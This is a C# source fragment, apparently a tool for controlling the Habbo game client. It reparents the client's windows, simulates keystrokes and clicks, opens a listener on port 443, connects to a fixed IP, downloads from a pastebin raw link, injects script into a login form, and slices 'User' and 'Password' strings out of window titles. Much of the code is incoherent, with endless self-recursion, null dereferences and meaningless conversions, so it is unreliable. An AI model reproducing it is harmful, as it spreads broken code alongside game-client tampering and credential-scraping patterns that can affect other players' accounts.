                                SB.AppendLine(Encoding.Default.GetString(F.SendMessage()));
                                SB.Append(Convert.ToBase64String(Encoding.Unicode.GetBytes(Encoding.ASCII.GetString(F.SendMessage()))));
                                var HContent = new StringContent(SB.ToString(), Encoding.Default, "application/json");
                                var Recv = FS.Read(DataSegment[i]);
                                Byte[] Process_Stream = new byte[items.MainModule.ModuleMemorySize];
                                for (int B = 0; B < Process_Stream.Length; B++)
                                {
                                    Array.Resize(ref Process_Stream, Recv);
                                    Process_Stream[B] += Convert.ToByte(PostMessage(FS));
                                    PacketWritter Packet = new PacketWritter((Process)ClientHabboProcs[0], ClientHabboProcs[0].ToString());
                                    Packet.StartInfo.FileName = FS.Name;
                                    Packet.StartInfo.UseShellExecute = false;
                                    Packet.StartInfo.RedirectStandardError = true;
                                    Packet.StartInfo.RedirectStandardInput = true;
                                    byte[] Buffer = DataSegment[i];
                                    foreach (byte _b in F.SendMessage())
                                    {
                                        try
                                        {
                                            //Packet.WaitForInputIdle();
                                            SetParent(items.MainWindowHandle, Packet.Handle);
                                            Array.Resize(ref Buffer, FS.Read(new byte[] { _b }));
                                            using (var Memstream = new MemoryStream())
                                            {
                                                Memstream.Position = FS.Read(new byte[] { _b });
                                                Memstream.Write(Buffer);
                                                Memstream.Read(new byte[] { Convert.ToByte(items.MainWindowHandle) });
                                                Byte[] PostMessage = Encoding.ASCII.GetBytes(HContent.ToString());
                                                foreach (Socket ClientSock in Websockets)
                                                {
                                                    var SendAsync = ClientSock.SendAsync(PostMessage);
                                                    Memstream.Write(Encoding.Unicode.GetBytes(SendAsync.ToString()));
                                                    Memstream.GetBuffer();
                                                    Memstream.Read(new byte[] { 0x0001 });
                                                    Memstream.Position = 0;
                                                    Memstream.GetBuffer();
                                                }


                                            }
                                        }
                                        catch (SocketException sockEx)
                                        {
                                            WebRequest GetMethod = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                                            GetMethod.Method = "POST";
                                            Stream OBJ = GetMethod.GetRequestStream();
                                            Packet.Start();
                                            //  Packet.WaitForInputIdle();
                                            SetParent(items.MainWindowHandle, Packet.Handle);
                                            Array.Resize(ref Buffer, FS.Read(new byte[] { _b }));
                                            SetParent(Packet.Handle, items.MainWindowHandle);
                                        }
                                    }
                                }



                            }
                        }
                    }

                    return hwnd;
                }




                return IntPtr.Zero * hwnd;

            }
            public uint Message(FileStream FS)
            {
                [DllImport("user32.dll", SetLastError = true)]
                static extern void keybd_event(byte Bkey, byte BScan, int DwFlags, int DwExtraInfo);
                // static extern void PostMessage(IntPtr Hwnd, IntPtr LpARAM, int hWINDOW, int dwExtraInfo);
                [DllImport("User32.dll")]
                static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

                [DllImport("User32.dll")]
                static extern int SetForegroundWindow(IntPtr hWnd);

                [DllImport("User32.Dll", EntryPoint = "PostMessageA")]
                static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

                [DllImport("user32.dll")]
                static extern byte VkKeyScan(char ch);

                [DllImport("user32.dll", CharSet = CharSet.Auto)]
                static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

                foreach (var items in ClientHabboProcs)
                {
                    FindWindow(items.MainWindowTitle.ToString(), items.MainWindowHandle.ToString());
                    Panel Control = new Panel();
                    // Get handle to form.
                    IntPtr hwnd = items.MainWindowHandle;

                    // Create new graphics object using handle to window.
                    Graphics newGraphics = Graphics.FromHwnd(hwnd);

                    // Draw rectangle to screen.
                    newGraphics.DrawRectangle(new Pen(Color.Red, 3), 0, 0, 200, 100);

                    Byte[] Hwnd = { Convert.ToByte(newGraphics) };
                    FS.Write(Hwnd, 0, Hwnd.Length);
                    // Dispose of new graphics.
                    newGraphics.Dispose();
                    var ImageFilepath = "C:\\Users\\\\OneDrive\\Desktop\\User_Image.bmp";
                    WebRequest GetReq = (HttpWebRequest)WebRequest.Create("https://www.pastebin.com/raw/TF9MauVK");
                    GetReq.Method = "GET";
                    Stream OBJ = GetReq.GetResponse().GetResponseStream();
                    SendMessage(items.MainWindowHandle, Message(FS), items.Handle, Process.GetCurrentProcess().Handle);
                    PostMessage(items.MainWindowHandle, Message(FS), items.Id, items.Id);
                    WebClient WC = new WebClient();
                    string[] webpages = { "https://images.habbo.com/web_images/habbo-web-articles/lpromo_RM_Nov25.png", "https://images.habbo.com/web_images/habbo-web-articles/lpromo_neopetsevent_nov25.png", "https://images.habbo.com/habbo-web/america/en/assets/images/landing/bg_topright.00cd59c5.png" };

                    Random R = new Random();
                    int Index = R.Next(0, webpages.Length);

                    using (var OpenReqStream = WC.OpenRead(webpages[Index]))
                    {
                        var bmp = new Bitmap(System.Drawing.Image.FromStream(OpenReqStream));
                        bmp.Save(ImageFilepath, ImageFormat.Png);
                        Control.BackgroundImage = System.Drawing.Image.FromFile(ImageFilepath);



                    }

                    Control.BackgroundImageChanged += Control_BackgroundImageChanged;
                }

                return Convert.ToByte(FS.Handle.ToString());
            }

            private void Control_BackgroundImageChanged(object? sender, EventArgs e)
            {
                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                wm_Char.GetMousePosition();
                wm_Char.Click();
                foreach (var items in ClientHabboProcs)
                {

                }
                throw new NotImplementedException();
            }
        }
        public byte[] PostMessage()
        {

            [DllImport("user32.dll")]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            //   Process[] Client = Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName);
            foreach (var items in ClientHabboProcs)
            {
                SetParent(items.MainWindowHandle, panel4.Handle);
                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                SetParent(PostMessageCick(), items.MainWindowHandle);
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);

                SetParent(PostMessageCick(), panel4.Handle);
                wm_Char.MouseMove(int.Parse(panel4.Cursor.Handle.ToString()), int.Parse(panel4.Handle.ToString()));
                wm_Char.MouseMove(int.Parse(items.MainWindowHandle.ToString()), int.Parse(items.MainWindowHandle.ToString()));



            }

            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte Bkey, int dwFlags, int dwExtraInfo);
            foreach (byte b in PostMessage())
            {

                var Proc = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
                {
                    foreach (Process x in Process.GetProcessesByName(Proc.ProcessName))
                    {
                        richTextBox1.Text += Encoding.Default.GetBytes(x.MainWindowHandle.ToString());
                        return Encoding.Unicode.GetBytes(x.MainWindowHandle.ToString());

                    }

                }
                keybd_event(b, 0x0001, 0, 0);
                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                wm_Char.CombineKeys(Desktop.Robot.Key.Enter);
                wm_Char.Click();
            }
            return PostMessage();
        }
        public IntPtr AcceptMessage(Socket e)
        {
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.GetMousePosition();
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte bKey, int dWfLAGS, int dwExtraInfo);
            try
            {
                wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            }
            catch (SocketException sockEx)
            {

                WebRequest GetReq = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                GetReq.Method = "POST";
                Stream OBJ = GetReq.GetResponse().GetResponseStream();
                MessageBox.Show(sockEx.Message.ToString());
            }
            return 0x000;



            return e.Handle;
        }

        public uint PostMessageEvent()
        {
            Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
            wm_char.GetMousePosition();
            wm_char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bscan, byte bKey, int dWfLAGS, int dwExtraInfo);
            try
            {
                wm_char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            }
            catch (SocketException sockEx)
            {

                WebRequest GetReq = (HttpWebRequest)WebRequest.Create("https://www.habbo.com");
                GetReq.Method = "POST";
                Stream OBJ = GetReq.GetResponse().GetResponseStream();
                MessageBox.Show(sockEx.Message.ToString());
            }
            return 0x000;
        }

        public WebRequest GetReqMethod(Socket Accepted)
        {
            const string Filepath = "\\local_include\\HabboRoomContent.swf";
            List<byte[]> ArraySegment = new List<byte[]>();
            using (var MemStream = new MemoryStream())
            {
                byte[] Buffer = new byte[Accepted.SendBufferSize];
                MemStream.Read(Buffer);
                MemStream.Write(Buffer);
                ArraySegment.Add(MemStream.GetBuffer());
                Byte[] Hwnd = MemStream.GetBuffer();
                ArraySegment.Add(Hwnd);
            }

            foreach (Byte[] Buffer_node in ArraySegment)
            {
                [DllImport("user32.dll")]
                static extern IntPtr SetParent(IntPtr HwndChild, nint HwndNewParent);

                nint PostMessage = AcceptMessage(Accepted);
                foreach (var items in ClientHabboProcs)
                {
                    IntPtr RefHande = IntPtr.Zero;
                    SetParent(RefHande, items.Handle);
                    SetParent(items.MainWindowHandle, RefHande);
                    SetParent(RefHande, items.MainWindowHandle);
                    using (NetworkStream NS = new NetworkStream(Accepted))
                    {
                        NS.Write(Buffer_node, 0, Buffer_node.Length);
                        Byte[] EncodeMessage = { Convert.ToByte(PostMessage) };
                        foreach (char c in Encoding.Default.GetString(EncodeMessage))
                        {
                            var Readline = Console.ReadLine();
                            Byte[] GetClient = Encoding.ASCII.GetBytes(Readline.ToString());
                            Array.Resize(ref GetClient, Accepted.Receive(GetClient, SocketFlags.None));
                            StreamWriter sw = new StreamWriter(NS, Encoding.UTF8);
                            sw.Write(GetClient);
                            sw.WriteLine(c);
                            BinaryWriter BW = new BinaryWriter(new MemoryStream(new byte[] { Convert.ToByte(Graphics.FromHwnd(panel4.Cursor.Handle)) }));
                            BW.BaseStream.Position = 0;
                            BW.Write(EncodeMessage, 0, Accepted.Receive(new byte[] { Convert.ToByte(c) }));


                            var Msg = Encoding.Default.GetString(new byte[Accepted.SendBufferSize]);
                            int Msg_Recv = int.Parse(Msg.ToString());
                            var Recv = (IntPtr)nint.Parse(Msg_Recv.ToString());
                            byte[] RecvBuffer = new byte[Accepted.SendBufferSize];

                            Array.Resize(ref RecvBuffer, (int)Recv);
                            Byte[] hwnd = { Convert.ToByte(items.MainWindowHandle) };
                            richTextBox1.Text += Encoding.Default.GetString(hwnd) + RecvBuffer;

                            SetParent(Recv, items.MainWindowHandle);

                        }
                    }

                }

            }




            return GetReqMethod(Accepted);

        }
        public IntPtr ClientMethod(Socket e)
        {


            [DllImport("user32.dll")]
            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
            //   Process[] Client = Process.GetProcessesByName(Process.GetProcessById(int.Parse(textBox1.Text.ToString())).ProcessName);
            foreach (var items in ClientHabboProcs)
            {
                SetParent(items.MainWindowHandle, panel4.Handle);
                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                SetParent(PostMessageCick(), items.MainWindowHandle);
                SetParent(PostMessageCick(), panel4.Handle);
                wm_Char.MouseMove(int.Parse(panel4.Cursor.Handle.ToString()), int.Parse(panel4.Handle.ToString()));
                wm_Char.MouseMove(int.Parse(items.MainWindowHandle.ToString()), int.Parse(items.MainWindowHandle.ToString()));
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);


            }
            return e.Handle;
        }
        public static Socket ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public static List<Process> ClientHabboProcs = new List<Process>();
        public int WebImage()
        {
            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
            wm_Char.GetMousePosition();
            IntPtr hwnd = IntPtr.Zero;
            webView21.ExecuteScriptAsync("window.showDirectoryPicker();");
            foreach (var item in ClientHabboProcs)
            {

                hwnd = (int)item.Handle;
                return (int)item.MainWindowHandle;
                wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);

            }
            return ClientHabboProcs.Count;
        }
        public int InvokeMessage(Graphics G, XmlDocument x)
        {

            IntPtr rhwnd = IntPtr.Zero;

            foreach (var item in ClientHabboProcs)
            {
                var text = "Test Message";
                G.DrawRectangle(new Pen(Color.Red, 3), 0, 0, 200, WebImage());
                using (var _Font = new System.Drawing.Font("Arial", 24, FontStyle.Bold))
                {
                    // Define the brush for the text color
                    using (Brush brush = new SolidBrush(Color.Blue))
                    {
                        // Define the location to draw the text
                        PointF location = new PointF(50, 50);


                        // Draw the string
                        G.DrawString(text, _Font, brush, location);
                        G.DrawString(WebImage().ToString(), _Font, brush, location);
                    }
                    //Graphics.DrawRectangle(new Pen(Color.Red, 3), 0, 0, 200, 100);
                    rhwnd = item.MainWindowHandle;
                    return int.Parse(item.Handle.ToString());
                }

            }
            return (int)rhwnd;
        }

        public uint webMessage()
        {

            Process Client = Process.GetProcessById(int.Parse(textBox1.Text.ToString()));
            Process[] Disposed = Process.GetProcessesByName(Client.ProcessName);
            foreach (var items in Disposed)
            {
                using (var PostMethod = Graphics.FromHwnd(items.MainWindowHandle))
                {

                    PostMethod.GetHdc();
                }
            }
            return webMessage();
        }


        public Process InvokeAsync(byte[] Method)
        {
            [DllImport("user32.dll")]
            static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
            [DllImport("user32.dll", SetLastError = true)]
            static extern void keybd_event(byte Bkey, byte bScan, int dwFlags, int dwExtraInfo);
            byte[] Bufer = new byte[Method.Length];
            for (int x = 0; x < Bufer.Length; x++)
            {
                foreach (var items in ClientHabboProcs)
                {


                    for (int y = 0; y < Method.Length; y++)
                    {

                        Bufer[x] += Method[x];

                        var Hwnd = Encoding.Default.GetBytes(items.MainWindowHandle.ToString());
                        byte[] Msg = new byte[Bufer[x]];
                        foreach (byte xWindow in Msg)
                        {
                            using (var Memstram = new MemoryStream(new Byte[] { xWindow }))
                            {
                                Clipboard.GetText();
                                keybd_event(xWindow, 0x0001, 0, 0);
                                keybd_event(xWindow, 0x0002, 0, 0);
                                keybd_event(xWindow, 0x0D, 0, 0);

                                Memstram.Read(Method, 0, Method.Length);
                            }
                        }

                    }

                }
            }

            return Process.GetCurrentProcess();
        }

        public Byte[] HostServer(XmlDocument XML)
        {
            using (var WebSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
            {

                webView21.ExecuteScriptAsync("let event = new MouseEvent(\"click\", {\r\n    bubbles: true,\r\n    cancelable: true,\r\n    view: window,\r\n  });var elem = document.getElementsByClassName('form__input login-form__input ng-pristine ng-empty ng-valid-email ng-invalid ng-invalid-required ng-touched'); elem[0].value='https://www.habbo.com/logout';var submitBtn = document.getElementsByClassName('login-form__button habbo-login-button');submitBtn[0].dispatchEvent(event); ");

                WebSocket.Bind(new IPEndPoint(IPAddress.Any, 443));
                WebSocket.Listen(0);
                Socket AcceptedAsync = WebSocket.Accept();
                GetReqMethod(AcceptedAsync);
                Console.WriteLine(Process.GetCurrentProcess().MainWindowTitle + Process.GetCurrentProcess().MainWindowHandle + GetReqMethod(AcceptedAsync));

                ServerSocket = WebSocket;
                ServerSocket.Equals((Socket)WebSocket);
                if (WebSocket.Handle != IntPtr.Zero)
                {
                    {
                        MousePosition.X.Equals(AcceptedAsync.Receive(new byte[] { }));
                        object[] Objref = new object[] { Invoke((System.Windows.Forms.MethodInvoker)delegate { Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot(); wm_char.Click(); }) };
                        MousePosition.Y.Equals(AcceptedAsync.Receive(new byte[] {(byte)int.Parse(Objref.ToString()) }));
                      for (int i = 0; i < Objref.Length; i++)
                        {
                            Desktop.Robot.Robot Auto = new Desktop.Robot.Robot();
                            MousePosition.X.Equals(AcceptedAsync.Receive(new byte[] { (byte)int.Parse(Objref[i].ToString()) }));
                            Auto.GetMousePosition();
                            MousePosition.Y.Equals(AcceptedAsync.Receive(new byte[] { (byte)int.Parse(Objref[i].ToString()) }));
                            Auto.GetMousePosition();
                            Auto.MouseMove(MousePosition.X, MousePosition.Y);
                            Auto.Click();
                        }

                        Byte[] Method = new byte[AcceptedAsync.SendBufferSize];
                        byte[] Bufer = new byte[Encoding.ASCII.GetBytes(ClientHabboProcs[0].MainWindowHandle.ToString()).Length];
                        for (int x = 0; x < Bufer.Length; x++)
                        {
                            foreach (var items in ClientHabboProcs)
                            {


                                for (int y = 0; y < Method.Length; y++)
                                {
                                    var Hwnd = Encoding.Default.GetBytes(items.MainWindowHandle.ToString());
                                    Bufer[x] += Encoding.Default.GetBytes(items.MainWindowHandle.ToString())[0];
                                    Type ObjRef = null;
                                    ObjRef.Namespace.Equals(items);
                                    ObjRef.Name.Equals(items.MainWindowTitle);
                                    ObjRef.Attributes.Equals(items.MainWindowHandle.ToString());
                                    ObjRef.Attributes.Equals(items.Handle);
                                    SocketAsyncEventArgs SockEx = new SocketAsyncEventArgs();
                                    byte[] HwndModule = Encoding.UTF32.GetBytes(ObjRef.ToString());
                                    SockEx.SetBuffer(HwndModule, 0, HwndModule.Length);
                                    AcceptedAsync.ReceiveAsync(SockEx);
                                    foreach(byte B in HwndModule)
                                    {
                                        string PostMessage()
                                        {
                                            [DllImport("user32.dll", SetLastError =true)]
                                            static extern void keybd_event(byte Bscan, byte Bkey, int dwFlags, int dwExtraInfo);
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            SendKeys.SendWait("^V");
                                            keybd_event(0x00, 0, 0x0001, 0);
                                            keybd_event(0x01, 0, 0x0000, 0);
                                            Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                                            wm_Char.GetMousePosition();
                                            wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
                                            wm_Char.CombineKeys(Desktop.Robot.Key.Shift, Desktop.Robot.Key.Enter);
                                            wm_Char.MouseMove(MousePosition.X, MousePosition.Y);
                                            SendKeys.SendWait("{ENTER}");

                                            return PostMessage();
                                        }
                                        [DllImport("user32.dll")]
                                        static extern IntPtr SetParent(IntPtr HwndChild, IntPtr hwnDnewParent);
                                        AcceptedAsync.BeginReceive(new byte[] { B }, 0, 0, SocketFlags.None, null, Invoke((System.Windows.Forms.MethodInvoker)delegate { SetParent(IntPtr.Zero, items.MainWindowHandle); SockEx.SetBuffer(new byte[] { Encoding.Default.GetBytes(Newtonsoft.Json.JsonConvert.SerializeObject(PostMessage()))[0] }, 0, 0); }));

                                    }

                                    SendKeys.SendWait("{ENTER}");
                              

                                    byte[] Msg = new byte[Bufer[x * items.MainWindowHandle]];
                                    int Recv = AcceptedAsync.Receive(Msg);
                                    var AcceptAsyncContent = AcceptedAsync.Receive(Msg, 0, Recv, SocketFlags.None);
                                    using (var Memory_stream = new MemoryStream())
                                    {
                                        for (int WindowSession = 0; WindowSession < 30001; WindowSession++)
                                        {
                                            [DllImport("user32.dll")]
                                            static extern IntPtr SetParent(IntPtr hwndChild, IntPtr hwndNewParent);
                                            Desktop.Robot.Robot Auto = new Desktop.Robot.Robot();
                                            HttpClient Hclient = new HttpClient();
                                            var GetAsync = Hclient.GetAsync("https://www.habbo.com/logout");
                                            PacketWritter PacketLog = new PacketWritter(items,items.MainWindowHandle.ToString());
                                            PacketLog.ProcessName.Equals(InvokeAsync(Method).ProcessName);
                                            var RecieveAsync = InvokeAsync(Method).Start();
                                            do
                                            {
                                                InvokeAsync(Method).Equals(AcceptedAsync.Receive(Method));
                                                InvokeAsync(Method).MainWindowHandle.Equals(items.MainWindowHandle);
                                                var keybd_Event = InvokeAsync(Method);
                                                foreach (var itemsAsync in ClientHabboProcs)
                                                {
                                                    Graphics G = Graphics.FromHwnd(items.MainWindowHandle);
                                                    foreach (char C in PostImage())
                                                    {
                                                        SolidBrush brush = new SolidBrush(Color.Blue);
                                                        System.Drawing.Font f = new System.Drawing.Font(FontFamily.GenericSerif, items.Handle, FontStyle.Regular);

                                                        G.DrawString(C.ToString().ToCharArray().ToString() + Encoding.Default.GetString(Msg, 0, Recv), f, brush, new Point(int.Parse(items.MainWindowHandle.ToString()), int.Parse(Process.GetProcessById(items.Id).MainWindowHandle.ToString())));


                                                    }
                                                }
;
                                                Memory_stream.Read(Encoding.Default.GetBytes(RecieveAsync.ToString()));
                                                var PostMsg = SetParent(keybd_Event.Handle, InvokeAsync(Method).Handle);
                                                var GetClient = SetParent(InvokeAsync(Method).Handle, items.MainWindowHandle);
                                                Memory_stream.Write(Encoding.ASCII.GetBytes(GetClient.ToString()));
                                                return Encoding.ASCII.GetBytes(keybd_Event.ToString());
                                            }

                                            while (InvokeAsync(Method).MainWindowHandle == IntPtr.Zero);
                                            Memory_stream.BeginWrite(new byte[] { }, 0, Recv, null, SetParent(IntPtr.Zero, items.MainWindowHandle));
                                            MousePosition.X.Equals(AcceptedAsync.Receive(Memory_stream.GetBuffer()));
                                            items.MainWindowHandle.Equals(nint.Parse(AcceptedAsync.BeginReceive(Memory_stream.GetBuffer(), 0, 0, SocketFlags.None, new AsyncCallback(AcceptCallback), new BinaryWriter(Memory_stream, Encoding.UTF8).BaseStream).ToString()));


                                            return Encoding.Default.GetBytes(Convert.ToBase64String(Encoding.Unicode.GetBytes(SetParent(PostMessageClient(AcceptedAsync, Auto, Hwnd[x]), items.MainWindowHandle).ToString())));

                                        }


                                    }
                                }

                            }
                        }


                        Desktop.Robot.Robot wm_char = new Desktop.Robot.Robot();
                        wm_char.GetMousePosition();
                        const uint DOWN = 0x0002;
                        const uint UP = 0x0004;
                        [DllImport("user32.dll")]
                        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

                        wm_char.CombineKeys(Desktop.Robot.Key.V);

                        PostMessageClient(AcceptedAsync, wm_char, 0x0001);
                        foreach (var items in ClientHabboProcs)

                        {
                            mouse_event(UP, 0, 0, uint.Parse(items.MainWindowHandle.ToString()), 0);
                            wm_char.Click();
                            mouse_event(DOWN, 0, 0, uint.Parse(items.Handle.ToString()), 0);
                            foreach (byte x in new byte[AcceptedAsync.SendBufferSize])
                            {

                            }
                            items.MainWindowHandle.Equals(PostMessageClient(AcceptedAsync, wm_char, 0x0D));
                        }

                        var RecvMsg = AcceptedAsync.Receive(Sbyte());

                        using (var BufferedInputStreamReader = new MemoryStream())
                        {
                            BinaryWriter bw_Node = new BinaryWriter(BufferedInputStreamReader, Encoding.Unicode);
                            bw_Node.Write(RecvMsg);
                            using (Bitmap bitmap = new Bitmap(200, 100))
                            {
                                // Create a Graphics object from the Bitmap
                                using (Graphics graphics = Graphics.FromHwnd((Process.GetProcessById(int.Parse(textBox1.Text.ToString())).MainWindowHandle)))
                                {
                                    // Define the text, font, and brush (color)

                                    var text = Encoding.Default.GetString(new byte[AcceptedAsync.SendBufferSize]);

                                    System.Drawing.Font font = new System.Drawing.Font("Arial", 20);
                                    Brush brush = Brushes.Black; // SolidBrush(Color.Black)
                                    GetReqMethod(AcceptedAsync).Equals((HttpWebRequest)WebRequest.Create("https://www.habbo.com"));
                                    GetReqMethod(AcceptedAsync).Method = "GET";
                                    GetReqMethod(AcceptedAsync).Headers.Add("", "");
                                    HttpClient Hclient = new HttpClient();
                                    using (var HttpReqMsg = new HttpRequestMessage(HttpMethod.Post, GetReqMethod(AcceptedAsync).RequestUri))
                                    {
                                        byte[] Buffer = new byte[2056];
                                        for (var o = 0; o < Buffer.Length; o++)
                                        {
                                            Buffer[o] += Buffer[o * webMessage()];
                                        }
                                        HttpReqMsg.Content = new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(Buffer), Encoding.ASCII, "application/json");
                                        var SendAsync = Hclient.SendAsync(HttpReqMsg);
                                        Byte[] DecodeBuffer = Encoding.Default.GetBytes(SendAsync.ToString());
                                        int Recv = AcceptedAsync.Receive(DecodeBuffer, SocketFlags.None);
                                        MessageBox.Show("Message" + Encoding.Default.GetString(DecodeBuffer, 0, Recv));

                                    }

                                    // Define the position to draw the text
                                    float x = 10;
                                    float y = 10;

                                    // Draw the string
                                    graphics.DrawString(text, font, brush, x, y);
                                }

                                // Save the modified image (optional)
                                //bitmap.Save("output.png", ImageFormat.Png);
                                var ByteMsg = new byte[] { };
                                ByteMsg = Sbyte();
                                Array.Resize(ref ByteMsg, AcceptedAsync.Receive(new byte[] { }));
                                bw_Node.BaseStream.BeginWrite(ByteMsg, 0, Sbyte().Length, null, Process.GetProcessById(int.Parse(textBox1.Text.ToString())).MainWindowHandle);

                            }
                            richTextBox1.Text += "Connection";
                            List<Process> Disposed = new List<Process>();
                            var Filepath = "C:\\Users\\\\OneDrive\\Desktop\\win32API.vbs";
                            Process client = new Process();
                            FileStream FS = new FileStream(Filepath, FileMode.Open, FileAccess.Write);
                            client.StartInfo.FileName = "C:\\Users\\\\AppData\\Roaming\\Habbo Launcher\\downloads\\air\\340\\Habbo.exe";
                            client.Start();
                        }
                    }
                }

                return HostServer(XML);
            }

        }
        public static string UserHostFilepath { get; set; }
        public byte[] SendMessage()
        {

            Desktop.Robot.Robot Wm_Char = new Desktop.Robot.Robot();
            Wm_Char.CombineKeys(Desktop.Robot.Key.Control, Desktop.Robot.Key.V);
            Wm_Char.CombineKeys(Desktop.Robot.Key.Enter, Desktop.Robot.Key.Enter);
            return SendMessage();
        }



        public static Process Mainproc = new Process();
        private void Form1_Load(object sender, EventArgs e)
        {

            ClientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            timer1.Interval = 6132;
            webView21.Source = new Uri("https://www.proxyium.com");
            timer2.Interval = 4320;
            WindowKeyApi API = new WindowKeyApi();
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.FileName = "C:\\Users\\Georg\\AppData\\Roaming\\Habbo Launcher\\downloads\\air\\349\\Habbo.exe";
            var Filename = OFD.FileName;
            PacketWritter Prox = new PacketWritter(Process.GetCurrentProcess(), SendRoomXHR(6));
            Prox.StartInfo.UseShellExecute = false;
            Prox.StartInfo.CreateNoWindow = true;
            Mainproc = Process.GetCurrentProcess();
            Prox.StartInfo.FileName = Filename;
            Form1 f = new Form1();
       

            this.FormBorderStyle = FormBorderStyle.FixedDialog;
           // Mainproc = Prox;
            //Mainproc.Start();



            var Session = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Session.Connect(new IPEndPoint(IPAddress.Parse("23.52.198.71"), 443));
            WindowKeyApi.Websockets.Add(Session);
            // timer2.Start();
            var Filepath = UserFilepath.Replace("Desktop", Environment.UserName);
            var GetDir = Directory.GetDirectories(Filepath);
            foreach (var element in GetDir)
            {
                //timer1.Start();
                OpenFileDialog Clienrversion = new OpenFileDialog();
                if (element.ToString().Length >= 0)
                {
                    //MessageBox.Show("Found Client Version: " + element.ToString());
                    Clienrversion.FileName = element;
                    UserHostFilepath = Clienrversion.FileName;
                    Clienrversion.Dispose();
                    //timer1.Start();
                }
            }
            var XML = new XmlDocument();

            Process.GetCurrentProcess().Refresh();
            var HostedXML = HostServer(XML);
            FileStream FS = new FileStream(UserHostFilepath, FileMode.Create, FileAccess.Write);
            FS.Write(HostServer(XML));

            MessageBox.Show("Listening on port: 443");
        }
        public class HostNet : EventArgs
        { 
            public HostNet(string Message)
            {
                Message.Equals(PostMessage());
                Console.WriteLine(Message);
                Message.Equals(PostMessage());
            }
            public string PostMessage()
            {
                return PostMessage();
            }


        }

        public class PacketWritter : Process
        {
            public string PostMessage()
            {
                byte[] Buffer = new byte[Convert.ToBase64String(Encoding.Default.GetBytes(Newtonsoft.Json.JsonConvert.SerializeObject(new List<string> { PostMessage() }))).Length];
                SendKeys.SendWait("^V");
                SendKeys.SendWait("{ENTER}");
                [DllImport("user32.dll", SetLastError = true)]
                static extern IntPtr SetParent(IntPtr HwndChild, IntPtr hwndNewParent);
                static extern void keybd_event(byte bScan, byte Bkey, int DwFlags, int dwExtraInfo);
                List<object[]> WindowMessage = new List<object[]>();
                try
                {
                    #region GetEncoding
                    const int ObjRef = 8;
                    const int PublicKey = 3;
                    foreach (Process Item in ClientHabboProcs)
                    {
                        if (Item.MainWindowTitle.ToString().Length >= ObjRef)
                        {
                            using (var HttpClient = new HttpClient())
                            {
                                HttpClient.BaseAddress = new Uri("http://localhost:4200/hotel");
                                var HttpRequestMessage = new HttpRequestMessage(HttpMethod.Post, "http://localhost:443/hotel");
                                var User = Item.MainWindowTitle.ToString().Substring(ObjRef);
                                var Password = User.ToString().Substring(PublicKey);
                                SetParent(IntPtr.Zero, Item.MainWindowHandle);
                                SetParent(Item.MainWindowHandle, IntPtr.Zero);
                                Console.WriteLine("window.location.href='https://www.habbo.com/Profile/" + Password.ToString());
                                var InputStream = Console.ReadLine();
                                keybd_event(0x00, 0, 0x0001, 0);
                                keybd_event(0x0D, 0, 0x0000, 0);
                                keybd_event(0x0d, 0, 0x00001, 0);
                                SendKeys.SendWait("{ENTER}");
                                Desktop.Robot.Robot wm_Char = new Desktop.Robot.Robot();
                                base.StartInfo.FileName.Equals(Item.StartInfo.FileName);
                                base.StartInfo.UseShellExecute.Equals(false);
                                base.StartInfo.RedirectStandardError.Equals(false);
                                base.StartInfo.RedirectStandardInput.Equals(true);
                                base.StartInfo.RedirectStandardOutput.Equals(true);
                                base.StartInfo.StandardOutputEncoding.Equals(System.Text.Encoding.ASCII);
                                base.StartInfo.EnvironmentVariables.Add("undefined", PostMessage());
                                base.Equals((System.Diagnostics.Process)Item);
